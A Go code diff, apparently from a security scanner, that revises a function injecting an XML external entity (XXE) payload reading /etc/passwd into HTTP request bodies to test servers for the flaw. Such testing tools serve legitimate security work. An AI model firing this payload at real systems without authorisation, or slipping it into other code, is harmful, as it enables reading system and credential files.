@@ -10,26 +10,30 @@ const kVulnerability = `
 <!DOCTYPE foo [
 	<!ELEMENT foo ANY >
 	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-  <foo>&xxe;</foo>
-`
+  <foo>&xxe;</foo>`
 
-func isXML(body []byte) bool {
-	return bytes.HasPrefix(body, []byte("<?xml"))
+var kXMLStart []byte = []byte("<?xml")
+
+func hasXML(body []byte) bool {
+	return bytes.Contains(body, kXMLStart)
 }
 
-func AddVulnerability(req *http.Request) error {
+func AddVulnerability(req *http.Request) (bool, error) {
+	hadXML := false
 	body, err := io.ReadAll(req.Body)
 	if err != nil {
-		return err
+		return hadXML, err
 	}
 
-	if isXML(body) {
-		idx := bytes.IndexByte(body, '>')
+	if hasXML(body) {
+		hadXML = true
+		xmlStart := bytes.Index(body, kXMLStart)
+		idx := xmlStart + bytes.IndexByte(body[xmlStart:], '>')
 		body = bytes.Join([][]byte{body[:idx+1], []byte(kVulnerability), body[idx+1:]}, []byte{})
 	}
 
 	req.Body = io.NopCloser(bytes.NewReader(body))
-	return nil
+	return hadXML, nil
 }
 
 func IsVulnerable(body []byte) bool {
